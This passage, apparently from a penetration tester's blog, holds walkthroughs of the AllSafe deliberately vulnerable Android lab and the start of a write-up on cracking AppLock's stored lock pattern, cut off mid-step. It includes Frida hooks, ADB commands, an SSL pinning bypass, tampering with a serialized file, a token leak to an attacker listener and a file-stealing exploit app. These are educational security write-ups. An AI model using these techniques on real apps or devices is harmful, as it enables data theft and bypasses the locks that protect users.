remove FLAG_SECURE (value = 8192) before it gets set\\r\\n        flags = flags & ~8192;\\r\\n        mask  = mask  & ~8192;\\r\\n        this.setFlags(flags, mask);\\r\\n        console.log(\\"[*] FLAG_SECURE removed\\");\\r\\n    };\\r\\n});\\r\\n```\\r\\n\\r\\n- Or use the codeshare directly:\\r\\n\\r\\n`frida --codeshare eiliyakeshtkar0/screenshot-protection -f com.example.allsafe`\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 9. Deep Link\\r\\n\\r\\n### Objective:\\r\\n\\r\\n![image.png](/img/image12.png)\\r\\n\\r\\n### Solution:\\r\\n\\r\\n- The app contains a hidden activity that can only be unlocked via a specific Deep Link. The goal is to find the correct URI and the required secret key.\\r\\n- Search the **AndroidManifest.xml** for keywords like `data`, `browsable`, or `android.intent.action.VIEW`. This reveals the Deep Link configuration:\\r\\n    \\r\\n    ![image.png](/img/image13.png)\\r\\n    \\r\\n- Browsing the `DeepLinkTask` class reveals the validation logic:\\r\\n\\r\\n```java\\r\\nIntent intent = getIntent();\\r\\nUri data = intent.getData();\\r\\n\\r\\n// Extracts the \\"key\\" parameter from the URI\\r\\nif (data.getQueryParameter(\\"key\\").equals(getString(R.string.key))) {\\r\\n    // Successfully unlocks the challenge\\r\\n    SnackUtil.INSTANCE.simpleMessage(this, \\"Good job, you did it!\\");\\r\\n}\\r\\n```\\r\\n\\r\\n- By checking  **`strings.xml`** the key is: `ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`\\r\\n    \\r\\n    ![image.png](/img/image14.png)\\r\\n    \\r\\n- **The data format for a Deep Link is `scheme://host:port/path?query` Combining the manifest data and the discovered key, we can construct the exploit URI: `allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`**\\r\\n- Now we can trigger deep link via ADB\\r\\n    \\r\\n```bash\\r\\n    adb shell am start \\\\\\r\\n      -n infosecadventures.allsafe/.challenges.DeepLinkTask \\\\\\r\\n      -a android.intent.action.VIEW \\\\\\r\\n      -d \\"allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c\\"\\r\\n```\\r\\n    \\r\\n- Solved\\r\\n\\r\\n![image.png](/img/image15.png)\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 10. Insecure Broadcast Receiver\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/image16.png)\\r\\n\\r\\n### Steps\\r\\n\\r\\n**Receiver Type**\\r\\n\\r\\n- **Static** \u2192 defined in `AndroidManifest.xml`\\r\\n- **Dynamic Receivers** \u2192 function `registerReceiver`\\r\\n\\r\\n---\\r\\n\\r\\n- in this challenge there is a receiver defined in manifest\\r\\n    \\r\\n    ![image.png](/img/image17.png)\\r\\n    \\r\\n    - `exported=\\"true\\"` + no `android:permission` \u2192 **anyone can trigger it**\\r\\n    - Action: `infosecadventures.allsafe.action.PROCESS_NOTE`\\r\\n- reviewing the **`NoteReceibver`** code , this code takes 3 extras\\r\\n    \\r\\n```java\\r\\n    public class NoteReceiver extends BroadcastReceiver {\\r\\n        @Override // android.content.BroadcastReceiver\\r\\n        public void onReceive(Context context, Intent intent) {\\r\\n            String server = intent.getStringExtra(\\"server\\");\\r\\n            String note = intent.getStringExtra(\\"note\\");\\r\\n            String notification_message = intent.getStringExtra(\\"notification_message\\");\\r\\n            OkHttpClient okHttpClient = new OkHttpClient.Builder().build();\\r\\n            HttpUrl httpUrl = new HttpUrl.Builder().scheme(\\"http\\").host(server).addPathSegment(\\"api\\").addPathSegment(\\"v1\\").addPathSegment(\\"note\\").addPathSegment(\\"add\\").addQueryParameter(\\"auth_token\\", \\"YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=\\").addQueryParameter(\\"note\\", note).build();\\r\\n            Log.d(\\"ALLSAFE\\", httpUrl.getUrl());\\r\\n            Request request = new Request.Builder().url(httpUrl).build();\\r\\n```\\r\\n    \\r\\n    - `server` Used as Host in the HTTP URL \u2192 **attacker controlled**\\r\\n    - `note` Used as query parameter\\r\\n    - `notification_message`  Received but unused\\r\\n- Then uses those extras to send Https request the resulting URL  `**http://<server>/api/v1/note/add?auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=&note=<note>**`\\r\\n- The Problem here there is Unvalidated `server` extra so attacker sends a broadcast to a server under his control, the app makes HTTP request to this server \u2014> Auth token leaks in URL.\\r\\n\\r\\n---\\r\\n\\r\\n<aside>\\r\\n\u{1F4A1}\\r\\n\\r\\n**Permission re-delegation** is a security vulnerability in which a malicious application exploits another application that has higher privileges to perform actions or access data that it would not normally be allowed to access.\\r\\n\\r\\n</aside>\\r\\n\\r\\n**in this example** \\r\\n\\r\\n![image.png](/img/image18.png)\\r\\n\\r\\n---\\r\\n\\r\\n- We can exploit this with adb\\r\\n    \\r\\n```bash\\r\\n    adb shell am broadcast \\\\\\r\\n      -a infosecadventures.allsafe.action.PROCESS_NOTE \\\\\\r\\n      -n infosecadventures.allsafe/.challenges.NoteReceiver \\\\\\r\\n      --es server \\"10.0.2.2\\" \\\\\\r\\n      --es note \\"hacked\\" \\\\\\r\\n      --es notification_message \\"x\\"\\r\\n```\\r\\n    \\r\\n- The attacker start a listener on his machine **`nc -lvnp 80` , will receive something like this `GET /api/v1/note/add?auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=&note=hacked` ,**\\r\\n- **just decode it `echo \\"YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=\\" | base64 -d`  \u2014> allsafe_dev_admin_token**\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 11. Vulnerable Webview\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/image21.png)\\r\\n\\r\\n- Reviewing code reveals\\r\\n    \\r\\n    ![image.png](/img/image22.png)\\r\\n    \\r\\n- Because of **`setJavaScripptEnabled`**\\r\\n    \\r\\n    ![image.png](/img/image23.png)\\r\\n    \\r\\n- Because of **`setAllowFileAccess`**: it supports File schema we can review internal files like **`/etc/hosts`**\\r\\n    \\r\\n    ![image.png](/img/image24.png)\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 12. Certificate Pinning\\r\\n\\r\\n![image.png](/img/image25.png)\\r\\n\\r\\n<aside>\\r\\n\u{1F4A1}\\r\\n\\r\\nSSL pinning (certificate pinning) forces an app to trust **only specific certificates or public keys** instead of any certificate signed by a trusted CA. Even if an attacker installs a custom CA (like Burp Suite\'s), the app rejects the TLS handshake \u2014 because the cert doesn\'t match the hardcoded pin.\\r\\n\\r\\n</aside>\\r\\n\\r\\nUsed Objection to bypass SSL Pinning \\r\\n\\r\\n```bash\\r\\nobjection -n infosecadventures.allsafe start\\r\\nandroid sslpinning disable\\r\\n```\\r\\n\\r\\n![image.png](/img/image26.png)"},{"id":"allsafe-part3","metadata":{"permalink":"/W0W/allsafe-part3","source":"@site/blog/2026-05-01-allsafe-part3.md","title":"AllSafe - Part 3","description":"AllSafe Part 3 covers challenges 14\u201318: Weak Crypto, Insecure Service, Object Serialization, Insecure Provider, and Native Library.","date":"2026-05-01T00:00:00.000Z","tags":[],"readingTime":8.98,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"allsafe-part3","title":"AllSafe - Part 3","authors":["wesam"],"date":"2026-05-01T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"AllSafe - Part 2","permalink":"/W0W/allsafe-part2"},"nextItem":{"title":"AppLock - Pattern Crack","permalink":"/W0W/applock-pattern"}},"content":"AllSafe Part 3 covers challenges 14\u201318: Weak Crypto, Insecure Service, Object Serialization, Insecure Provider, and Native Library.\\r\\n\\r\\n{/* truncate */}\\r\\n\\r\\n---\\r\\n\\r\\n## 13. Weak Crypto\\r\\n\\r\\n![image.png](/img/image30.png)\\r\\n\\r\\n- Just used this script from frida codeshare\\r\\n    \\r\\n```bash\\r\\n    frida --codeshare fadeevab/intercept-android-apk-crypto-operations -U -f package_name\\r\\n```\\r\\n    \\r\\n- Once a crypto operation is detected, view it with all info we need\\r\\n    \\r\\n    ![image.png](/img/image31.png)\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 14. Insecure Service\\r\\n\\r\\n### **Objective:**\\r\\n\\r\\n![image.png](/img/image32.png)\\r\\n\\r\\n#### Solution:\\r\\n\\r\\n- The app has a recording service, once you click **START SERVICE**, the message `Audio recording started!` appears and audio recording runs in the background for a second, then the recorded audio is stored in `/storage/emulated/0/Download/allsafe_rec_<Date>.mp3`\\r\\n    \\r\\n    ![image.png](/img/image33.png)\\r\\n    \\r\\n    ![image.png](/img/image34.png)\\r\\n    \\r\\n- Decompile the APK and search for `Audio recording started!` \u2014 this leads to `RecorderService` class\\r\\n    \\r\\n```java\\r\\n    private File getOutputFile() {\\r\\n        SimpleDateFormat dateFormat = new SimpleDateFormat(\\"yyyyMMdd_HHmmssSSS\\", Locale.US);\\r\\n        String fullPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + \\"/allsafe_rec_\\" + dateFormat.format(new Date()) + \\".mp3\\";\\r\\n        Toast.makeText(getApplicationContext(), \\"File: \\" + fullPath, 0).show();\\r\\n        return new File(fullPath);\\r\\n    }\\r\\n```\\r\\n    \\r\\n- This code confirms the file path format shown earlier.\\r\\n- Checking `AndroidManifest.xml` \u2014 the service has `android:exported=\\"true\\"`, so we can trigger it externally via ADB without any user interaction\\r\\n    \\r\\n    ![image.png](/img/image35.png)\\r\\n    \\r\\n- Since we know the file location, we can start the recording and steal the file.\\r\\n    \\r\\n```bash\\r\\n    a54x:/ # cd /storage/emulated/0/Download\\r\\n    a54x:/storage/emulated/0/Download # ls\\r\\n    allsafe_rec_20260407_012729078.mp3  allsafe_rec_20260407_012950865.mp3  ...  flag.txt\\r\\n    a54x:/storage/emulated/0/Download # cat flag.txt\\r\\n    76400a3229290e7d6ada977227f9ecc3\\r\\n```\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 15. Object Serialization\\r\\n\\r\\n### What is Serialization\\r\\n\\r\\n![image.png](/img/image36.png)\\r\\n\\r\\n- A Java object lives in RAM. When the app closes, RAM is wiped \u2014> the object is gone.\\r\\n- Serialization = **converting a live object into a sequence of bytes so it can be saved to disk or sent over the network.**\\r\\n- **Deserialization = reading those bytes back and reconstructing the object.**\\r\\n\\r\\n#### Example:\\r\\n\\r\\n- Training a model takes hours. After training, you serialize it to `model.pkl`. Next time, you just load it \u2014> no re-training needed.\\r\\n\\r\\n---\\r\\n\\r\\n### Challenge\\r\\n\\r\\n![image.png](/img/image37.png)\\r\\n\\r\\n### Steps\\r\\n\\r\\n- Opening the APK in JADX, the challenge logic is inside `onCreateView` in the `ObjectSerialization` fragment. There are two button listeners: `save` and `load`.\\r\\n    \\r\\n    ![image.png](/img/image38.png)\\r\\n    \\r\\n- The `save` listener creates a `User` object from the UI fields and serializes it to `user.dat` on external storage using Java\'s built-in `ObjectOutputStream`:\\r\\n    \\r\\n```java\\r\\n    User user = new User(username.getText().toString(), password.getText().toString());\\r\\n    \\r\\n    File file = new File(path);\\r\\n    FileOutputStream fos = new FileOutputStream(file);\\r\\n    ObjectOutputStream oos = new ObjectOutputStream(fos);\\r\\n    oos.writeObject(user);  // converts the User object \u2192 bytes \u2192 writes to file\\r\\n    \\r\\n    oos.close();\\r\\n    fos.close();\\r\\n```\\r\\n    \\r\\n    - `FileOutputStream` \u2014 opens the file for writing raw bytes.\\r\\n    - `ObjectOutputStream` \u2014 wraps it and adds the serialization logic: it reads every field in the `User` object and encodes them into a structured byte stream.\\r\\n    - `writeObject(user)` \u2014 triggers the conversion: Java walks through all fields (`username`, `password`, `role`) and writes their values as bytes into `user.dat`.\\r\\n- Viewing User class, role is hardcoded default value.\\r\\n    \\r\\n```java\\r\\n    public static class User implements Serializable {\\r\\n        String username;\\r\\n        String password;\\r\\n        String role = \\"ROLE_AUTHOR\\";  // hardcoded default, always this\\r\\n    }\\r\\n```\\r\\n    \\r\\n    - The `User` class implements `Serializable` \u2014 a marker interface with no methods. It\'s just a tag that tells the Java runtime \\"this object is allowed to be serialized\\". Without it, `writeObject()` throws a `NotSerializableException`\\r\\n- Lets explain how deserialization is implemented, The `load` listener reads `user.dat` back using `ObjectInputStream` and reconstructs the `User` object from the bytes:\\r\\n    \\r\\n```java\\r\\n    File file = new File();\\r\\n    FileInputStream fis = new FileInputStream(file);\\r\\n    ObjectInputStream ois = new ObjectInputStream(fis);\\r\\n    User user = (User) ois.readObject();  // reads bytes \u2192 reconstructs User object\\r\\n    \\r\\n    ois.close();\\r\\n    fis.close();\\r\\n```\\r\\n    \\r\\n    - **`readObject()`** \u2014 triggers the reconstruction: Java reads the bytes from `user.dat` and maps them back into a `User` object with all its fields restored exactly as they were when saved \u2014 including `role`.\\r\\n- After reconstruction, the app makes a security decision based on the `role` field from the deserialized object:\\r\\n    \\r\\n```java\\r\\n    if (!user.role.equals(\\"ROLE_EDITOR\\")) {\\r\\n        // \\"Sorry, only editors have access!\\"\\r\\n    } else {\\r\\n        // \\"Good job!\\"\\r\\n    }\\r\\n```\\r\\n\\r\\n---\\r\\n\\r\\n- The problem here is that the app **never verifies** that the file came from itself or that it was not tampered with. It blindly trusts whatever `role` value is inside the bytes.\\r\\n- Since We know the path is on external storage /`sdcard/Android/data/infosecadventures.allsafe/files/user.dat` , we can access file and modify Role.\\r\\n    \\r\\n```java\\r\\n    final String path = requireActivity().getExternalFilesDir(null) + \\"/user.dat\\";\\r\\n```\\r\\n    \\r\\n- To can edit the role, first pull user.dat file into my kali machine `adb pull /sdcard/Android/data/infosecadventures.allsafe/files/user.dat`\\r\\n- I used sed to edit role to editor `sed -i \'s/ROLE_AUTHOR/ROLE_EDITOR/\' user.dat`\\r\\n- Then push user.dat back to device, now we can load data\\r\\n    \\r\\n    ![image.png](/img/image39.png)\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 16. Insecure Provider\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/image40.png)\\r\\n\\r\\n### Steps\\r\\n\\r\\n- Opened `AndroidManifest.xml` in JADX, searched for `<provider>` tags and found two **`DataProvider`** \u2192 `exported=\\"true\\"` , and **`FileProvider`** \u2192 `exported=\\"false\\"`\\r\\n    \\r\\n    ![image.png](/img/image41.png)\\r\\n    \\r\\n- Opened `DataProvider.java` and examined the two key methods:\\r\\n    - `onCreate()`:\\r\\n        \\r\\n```java\\r\\n        public boolean onCreate() {\\r\\n            this.noteDatabaseHelper = new NoteDatabaseHelper(getContext());\\r\\n            uriMatcher.addURI(\\"infosecadventures.allsafe.dataprovider\\", \\"note\\", 123);\\r\\n            return false;\\r\\n        }\\r\\n```\\r\\n        \\r\\n    - `query()`:\\r\\n        \\r\\n```java\\r\\n        public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {\\r\\n            SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();\\r\\n            queryBuilder.setTables(\\"note\\");\\r\\n            return queryBuilder.query(this.noteDatabaseHelper.getReadableDatabase(), projection, selection, selectionArgs, null, null, sortOrder);\\r\\n        }\\r\\n```\\r\\n        \\r\\n    - `uriMatcher` registered in `onCreate()` but **never called in `query()` ,** URI path is completely ignored \u2014 any path works, not just `/note`\\r\\n    - No `checkCallingPermission()` or `enforceReadPermission()`  , Any app or ADB can call this provider freely\\r\\n\\r\\n<aside>\\r\\n\u{1F4A1}\\r\\n\\r\\nContent Provider URIs follow this structure:\\r\\n\\r\\n![image.png](/img/image46.png)\\r\\n\\r\\nFrom manifest \\r\\n\\r\\n![image.png](/img/image42.png)\\r\\n\\r\\n</aside>\\r\\n\\r\\n- We can query this `DataProvider` with adb to get all notes  **`adb shell content query \u2014uri content://infosecadventures.allsafe.dataprovider`**\\r\\n    \\r\\n    ![image.png](/img/image44.png)\\r\\n    \\r\\n- Because `query()` never checks the URI path, even a garbage path works:\\r\\n    \\r\\n    `adb shell content query --uri content://infosecadventures.allsafe.dataprovider/anything`\\r\\n    \\r\\n    ![image.png](/img/image44.png)\\r\\n\\r\\n---\\r\\n\\r\\n#### 2nd Provider **`FileProvider`**\\r\\n\\r\\n- As we see this Provider isn\'t exported,\\r\\n\\r\\n![image.png](/img/image45.png)\\r\\n\\r\\n- **`exported=\\"false\\"`** = no outside app can access the provider **at all.**\\r\\n- **`grantUriPermissions=\\"true\\"`** = adds **one exception**: the app can temporarily share a single specific file with another app via an Intent flag.\\r\\n- **`provider_paths` the whitelist:** Tells `FileProvider`**which folders it\'s allowed to share files from**. It will refuse to generate a URI for any file outside these folders.\\r\\n\\r\\n<details>\\r\\n<summary>**Path Types Reference**</summary>\\r\\n\\r\\n| Path Type | Points To | Notes |\\r\\n|-----------|-----------|-------|\\r\\n| `<files-path>` | `/data/data/com.app/files/` | App\'s private internal storage |\\r\\n| `<cache-path>` | `/data/data/com.app/cache/` | Temporary files, can be deleted by Android |\\r\\n| `<external-path>` | `/sdcard/` | Public shared storage |\\r\\n| `<external-files-path>` | `/sdcard/Android/data/com.app/files/` | Private folder on SD card, deleted on uninstall |\\r\\n| `<external-cache-path>` | `/sdcard/Android/data/com.app/cache/` | Temporary files on SD card |\\r\\n| `<root-path>` | `/` |  Dangerous \u2014 entire filesystem |\\r\\n\\r\\n</details>\\r\\n\\r\\n- In Our challenge, the **`res/xml/Provider_Paths.xml`**  file\\r\\n    \\r\\n```java\\r\\n    <?xml version=\\"1.0\\" encoding=\\"utf-8\\"?>\\r\\n    <paths>\\r\\n        <files-path\\r\\n            name=\\"files\\"\\r\\n            path=\\".\\"/>\\r\\n    </paths>\\r\\n```\\r\\n    \\r\\n    - `<files-path>` \u2192 base is `/data/data/infosecadventures.allsafe/files/`\\r\\n    - `path=\\".\\"` \u2192 everything inside that folder is allowed\\r\\n    - `name=\\"files\\"` \u2192 alias used in the generated URI\\r\\n\\r\\nSo a file at:\\r\\n\\r\\n`/data/data/infosecadventures.allsafe/files/`\\r\\n\\r\\nGets shared as:\\r\\n\\r\\n`content://infosecadventures.allsafe.fileprovider/files/secret.txt` \\r\\n\\r\\n---\\r\\n\\r\\n- To be able to read files from `FileProvider` we have to find another component that **forwards intents without validation**. Search for these patterns in JADX:\\r\\n1. **Intent forwarding: Any activity that takes an intent from outside and passes it internally** \\r\\n    \\r\\n```java\\r\\n    startActivity(getIntent().getParcelableExtra(\\"...\\"))\\r\\n    startActivityForResult(getIntent().getParcelableExtra(\\"...\\"), ...)\\r\\n```\\r\\n    \\r\\n2. **URI reading: any activity that receives a URI and opens it** \\r\\n    \\r\\n```java\\r\\n    getIntent().getData()\\r\\n    getIntent().getParcelableExtra(\\"...\\")\\r\\n    getContentResolver().openInputStream(uri)\\r\\n```\\r\\n    \\r\\n3.  **WebView loading a URI: WebView can render file contents directly \u2014 acts as both reader and display.**\\r\\n    \\r\\n```java\\r\\n    webView.loadUrl(uri.toString())\\r\\n    webView.loadUrl(getIntent().getStringExtra(\\"...\\"))\\r\\n```\\r\\n\\r\\n---\\r\\n\\r\\n- Here in this challenge I found an exported activity called **`ProxyActivity` that takes an intent as extra**\\r\\n    \\r\\n```java\\r\\n    public class ProxyActivity extends AppCompatActivity {\\r\\n        @Override\\r\\n        protected void onCreate(Bundle savedInstanceState) {\\r\\n            super.onCreate(savedInstanceState);\\r\\n            startActivity((Intent) getIntent().getParcelableExtra(\\"extra_intent\\"));\\r\\n        }\\r\\n```\\r\\n    \\r\\n- In this challenge we can\'t use ADB as ADB can forward intents via `am start`, but it has two hard limitations here:\\r\\n    \\r\\n    | Limitation | Why |\\r\\n    | --- | --- |\\r\\n    | Can\'t set `FLAG_GRANT_READ_URI_PERMISSION` on the inner intent | Without this flag, FileProvider will refuse to serve the file to an outside component |\\r\\n    | Can\'t act as a reader | ADB has no activity to receive the file URI and call `openInputStream()` \u2014 only code running on the device can do that |\\r\\n    \\r\\n    So even if ADB reaches `ProxyActivity`, the file bytes have nowhere to go.\\r\\n    \\r\\n- The solution is to write a malicious app with two components:\\r\\n    1. **A trigger** (`MainActivity`) \u2014 crafts the nested intent and fires it:\\r\\n        \\r\\n```java\\r\\n        public void exploit(View view) {\\r\\n            Intent extra = new Intent();\\r\\n            extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\\r\\n            extra.setClassName(getPackageName(), \\"com.example.stealer.steal\\");\\r\\n            extra.setData(Uri.parse(\\r\\n                \\"content://infosecadventures.allsafe.fileprovider/docs/readme.txt\\"));\\r\\n        \\r\\n            Intent intent = new Intent();\\r\\n            intent.setComponent(new ComponentName(\\r\\n                \\"infosecadventures.allsafe\\",\\r\\n                \\"infosecadventures.allsafe.ProxyActivity\\"));\\r\\n            intent.putExtra(\\"extra_intent\\", extra);\\r\\n            startActivity(intent);\\r\\n        }\\r\\n```\\r\\n        \\r\\n    2.  **stealer activity** (`com.example.stealer.steal`) \u2014 the reader that receives the file URI and reads its contents:\\r\\n        \\r\\n```java\\r\\n        public class steal extends AppCompatActivity {\\r\\n            @Override\\r\\n            protected void onCreate(Bundle savedInstanceState) {\\r\\n                super.onCreate(savedInstanceState);\\r\\n                setContentView(R.layout.activity_steal);\\r\\n        \\r\\n                try {\\r\\n                    Log.d(\\"LEAK\\", IOUtil.toString(\\r\\n                        getContentResolver().openInputStream(getIntent().getData())\\r\\n                    ));\\r\\n                } catch (Exception e) {\\r\\n                    throw new RuntimeException(e);\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n```\\r\\n        \\r\\n    - `getIntent().getData()` \u2192 receives the FileProvider URI forwarded by `ProxyActivity`\\r\\n    - `getContentResolver().openInputStream()` \u2192 opens the file stream\\r\\n    - `IOUtil.toString()` \u2192 reads all bytes to a string\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 17. Native Library\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/image47.png)\\r\\n\\r\\n### Steps\\r\\n\\r\\n- Opened the APK in JADX and navigated to the `NativeLibrary` fragment.\\r\\n- Found that the password validation is delegated entirely to a native method\\r\\n    \\r\\n```java\\r\\n    private final native boolean checkPassword(String password);\\r\\n    static {\\r\\n        System.loadLibrary(\\"native_library\\");\\r\\n    }\\r\\n```\\r\\n    \\r\\n- The click handler logic is straightforward \u2014 if `checkPassword()` returns `false`, it shows \\"Wrong password, try harder!\\", if `true` \u2192 \\"That\'s it! Excellent work!\\", so we have to **make `checkPassword()` return `true`.**\\r\\n- In order to reverse .so file,  Decompiled the APK using `apktool`: **`apktool d target.apk -o output/` then navigate to `output/lib/arm64-v8a/libnative_library.so`**\\r\\n- Loaded `libnative_library.so` into Ghidra,  in functions section, found the mangled JNI export name **`:Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword`**\\r\\n    \\r\\n    ![image.png](/img/image48.png)\\r\\n    \\r\\n- The actual password logic lives inside `checkPass()` \u2014 but we don\'t need to reverse it further. We have the export name, which is enough to hook it directly.\\r\\n\\r\\n#### Frida script\\r\\n\\r\\n```javascript\\r\\nInterceptor.attach(Module.findExportByName(null, \\"android_dlopen_ext\\"), {\\r\\n    onEnter: function(args){\\r\\n        var path = Memory.readUtf8String(args[0]);\\r\\n        console.log(\\"[*] \\" + path);\\r\\n        nhook(path);\\r\\n    }\\r\\n});\\r\\n\\r\\nfunction nhook(path){\\r\\n    if (path.indexOf(\\"libnative_library.so\\") != -1){\\r\\n        setTimeout(function(){\\r\\n            var jni = Module.findExportByName(\\"libnative_library.so\\",\\r\\n                \\"Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword\\");\\r\\n\\r\\n            Interceptor.attach(jni, {\\r\\n                onEnter: function(args){},\\r\\n                onLeave: function(ret){ ret.replace(1); }\\r\\n            });\\r\\n        }, 2000);\\r\\n    }\\r\\n}\\r\\n```\\r\\n\\r\\n- Used `android_dlopen_ext` \u2014 a system-level function called whenever a `.so` is loaded \u2014 to detect when our target library is mapped into memory, then attach the hook.\\r\\n- **Why `android_dlopen_ext`?** \u2014 It fires on every `.so` load. We intercept it, check if the loaded path contains our library name, then set up the real hook.\\r\\n- **Why `setTimeout(..., 2000)`?** \u2014 After `dlopen_ext` fires, the library needs a moment to fully initialize in memory before `findExportByName` can resolve its symbols. The delay ensures the module is ready.\\r\\n- **`ret.replace(1)`** \u2014 Replaces the return value of `checkPassword` with `1` (true) regardless of what `checkPass()` actually computed.\\r\\n\\r\\n**Running the Hook**\\r\\n\\r\\n**`frida -U -f infosecadventures.allsafe -l hook.js`**"},{"id":"applock-pattern","metadata":{"permalink":"/W0W/applock-pattern","source":"@site/blog/2026-04-27-AppLock.md","title":"AppLock - Pattern Crack","description":"{/ truncate /}","date":"2026-04-27T00:00:00.000Z","tags":[],"readingTime":2.25,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"applock-pattern","title":"AppLock - Pattern Crack","authors":["wesam"],"date":"2026-04-27T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"AllSafe - Part 3","permalink":"/W0W/allsafe-part3"}},"content":"{/* truncate */}\\r\\n\\r\\n### Objective\\r\\n\\r\\n- Find where the lock pattern is stored in the AppLock app, understand how it\'s protected, and crack it to retrieve the original pattern.\\r\\n\\r\\n---\\r\\n\\r\\n### Steps\\r\\n\\r\\n**Step 1: Check common storage locations**\\r\\n\\r\\n- Started with `SharedPreferences` as it\'s the most common place apps store settings and credentials:\\r\\n    \\r\\n    ```bash\\r\\n    adb shell\\r\\n    cd /data/data/com.domobile.applock/shared_prefs\\r\\n    cat *\\r\\n    ```\\r\\n    \\r\\n- **Found this interesting entry:**\\r\\n    \\r\\n    ```xml\\r\\n    <string name=\\"image_lock_pattern\\">agYrmzRS42ZAcYGhv5Lqc+ntTEg=\\r\\n    </string>\\r\\n    ```\\r\\n    \\r\\n    - The pattern is stored under the key `image_lock_pattern`\\r\\n    - The value `agYrmzRS42ZAcYGhv5Lqc+ntTEg=` looks like **Base64** \u2014 recognizable by the `=` padding at the end\\r\\n\\r\\n---\\r\\n\\r\\n**Step 2: Decompile and trace the code**\\r\\n\\r\\n- Decompiled the APK using JADX and searched for `image_lock_pattern` to understand how the pattern is saved.\\r\\n- **Found in JADX search results:**\\r\\n    \\r\\n    ```java\\r\\n    gb.a(this.a, \\"image_lock_pattern\\", Base64.encodeToString(d(list), 0));\\r\\n    ```\\r\\n    \\r\\n- This tells us:\\r\\n    - The pattern goes through function `d(list)` first.\\r\\n    - The result is then **Base64 encoded.**\\r\\n    - Then stored in SharedPreferences under `image_lock_pattern` .\\r\\n\\r\\n---\\r\\n\\r\\n**Step 3 \u2014 Understand the `d()` function**\\r\\n\\r\\n```java\\r\\n\\r\\nstatic byte[] d(List list) {\\r\\n    int size = list.size();\\r\\n    byte[] bArr = new byte[size];\\r\\n\\r\\n    // Step 1: convert pattern points to bytes\\r\\n    for (int i = 0; i < size; i++) {\\r\\n        f fVar = (f) list.get(i);\\r\\n        bArr[i] = (byte) (fVar.b() + (fVar.a() * 3));\\r\\n        // each dot = column + (row * 3)\\r\\n        // dot 0 = top-left, dot 8 = bottom-right\\r\\n    }\\r\\n\\r\\n    // Step 2: hash the bytes with SHA-1\\r\\n    return MessageDigest.getInstance(\\"SHA-1\\").digest(bArr);\\r\\n}\\r\\n\\r\\n```\\r\\n\\r\\n**What\'s happening step by step:**\\r\\n\\r\\n- Each dot on the 3x3 grid is mapped to a number (0\u20138) based on its position:\\r\\n| 0 | 1 | 2 |\\r\\n| 3 | 4 | 5 |\\r\\n| 6 | 7 | 8 |\\r\\n- Those numbers are converted to bytes.\\r\\n- The bytes are hashed with **SHA-1,** The **SHA-1 hash is Base64 encoded and stored**.\\r\\n- The full protection chain:\\r\\nPattern dots \u2192 bytes \u2192 SHA-1 hash \u2192 Base64 encode \u2192 SharedPreferences.\\r\\n\\r\\n---\\r\\n\\r\\n**Why it\'s crackable**\\r\\n\\r\\n- **SHA-1 is a one-way hash** \u2014 can\'t be reversed directly\\r\\n- BUT the Android pattern only has **9 dots** and a very limited number of valid combinations\\r\\n- **No salt is used** \u2014 same pattern always produces the same hash\\r\\n- This makes it **brute-forceable** in under a second \u2014 try every possible pattern, hash it, compare to the stored hash\\r\\n\\r\\n---\\r\\n\\r\\n**Step 4: Crack the pattern**\\r\\n\\r\\n<aside>\\r\\n\u{1F4A1}\\r\\n\\r\\nSeveral tools exist online to crack Android pattern locks automatically. Two well-known ones are **APLCracker** (the tool used in this writeup) and **androidpatternlock**\\r\\n\\r\\n</aside>\\r\\n\\r\\n- Decode Base64 to get the raw SHA-1 hash 